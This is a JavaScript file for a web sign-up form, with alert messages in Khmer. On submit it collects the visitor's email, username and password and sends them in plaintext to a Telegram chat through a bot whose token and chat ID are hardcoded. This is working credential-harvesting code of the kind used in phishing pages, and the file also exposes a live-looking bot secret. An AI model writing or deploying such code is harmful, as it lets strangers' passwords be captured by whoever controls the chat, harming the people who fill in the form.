

const BOT_TOKEN = "8326445763:AAEhryKL60bbSe0Y-YDYs2SPEM6XDW26cDw";
const CHAT_ID = "7176789176";
const URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

document.getElementById("Register").addEventListener("submit", (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const username = document.getElementById("text").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !username || !password) {
    alert("សូមបំពេញព័ត៌មានអោយពេញលេញ!");
    return;
  }

  const message = `<b>User Account</b>\nEmail: ${email}\nUsername: ${username}\nPassword: ${password}`;

  fetch(URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data.ok) {
        alert("បញ្ជូនទិន្នន័យជោគជ័យទៅ Telegram!");
        document.getElementById("Register").reset();
      } else {
        alert("បញ្ជូនបរាជ័យ!");
      }
    })
    .catch((err) => {
      alert("មានបញ្ហា ខណៈពេលបញ្ជូនទិន្នន័យ!");
      console.error(err);
    });
});
